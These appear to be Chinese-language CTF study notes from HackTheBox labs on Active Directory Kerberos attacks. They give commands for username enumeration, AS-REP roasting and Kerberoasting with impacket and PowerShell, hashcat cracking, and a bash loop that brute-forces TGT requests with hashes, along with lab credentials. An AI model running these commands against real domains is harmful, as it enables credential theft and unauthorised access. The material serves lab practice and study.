**内网开放88，需要做端口转发注意 ： 需要开启88和389两个端口的转发**

**与域同步时间：**
```bash
sudo net time set -S 10.129.229.239
sudo ntpdate rebound.htb
```


###### kerburte 
Per-authentication Enum Username
```bash
./kerbrute_linux_amd64 userenum --domain LicorDeBellota.htb --dc 10.129.228.115 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 1000

~/tool/kerbrute_linux_amd64 userenum -d htb.local --dc htb.local user_list  
```

同样原理使用 NMAP 也是可以的
```bash
sudo nmap -6 -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=./backup/user_list htb.local
```

###### AS-REP Roasting
非交互式的 Kerberos 预身份验证攻击 , 看是否某个⽤户碰巧有 `UF_DONT_REQUIRE_PREAUTH` 的标记设置为 true , 那就可以启动用户的 kerberos 认证过程，得到 hash
```bash
└─$ locate -i getnp                                                                              
/usr/bin/impacket-GetNPUsers                                                                     
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
```

```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.129.228.115 licordebellota.htb/ -usersfile user.list
```



###### GetUserSPNs.py (Kerberoasting)

![](photos/Pasted%20image%2020240204144112.png)

```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.228.115 licordebellota.htb/Kaorz:Roper4155 -request
usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.228.115 licordebellota.htb/Kaorz:Roper4155
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request [-k 禁用NTLM 使用kerberos认证]
```

**无需域身份验证请求执行** 
使用于 GetNPUsers 获取 hash 无法破解等情况
https://github.com/fortra/impacket/tree/c3ff33b39fe067e738d5625ce174d3d10f7a4b79
获取用户 SPN
https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1
```bash
. .\spn.ps1
```

```bash
impacket-GetUserSPNs -no-preauth jjones -usersfile ~/HackTheBox/rebound/username -dc-ip 10.129.229.114 rebound.htb/
```


**本机登录后同样方式获得用户** SPN 的 hash：
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
保存 SPN 到系统中
```powershell
PS> Add-Type -AssemblyName System.IdentityModel  
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
```
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1?source=post_page-----b95d3146cfe9--------------------------------
```powershell
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast
```
hash_raw 拿到 Sublime 处理格式，然后使用 hashcat 的-m 13100 Crack
`hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`


###### GetTGT.py
使用于匹配 hash 和 username，crackmapexec 有防火墙防爆破策略，使用 gettgt.py 暴力枚举匹配凭据
```bash
/usr/share/doc/python3-impacket/examples/getTGT.py
```

```bash
#!/bin/bash


while IFS='' read -r LINE || [ -n "${LINE}" ]
do
        echo "feed the Hash : ${LINE}"
        /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson@htb.local -hashes ${LINE}

done < password_hash

```
`Hash需要完整 xxx:xxx`

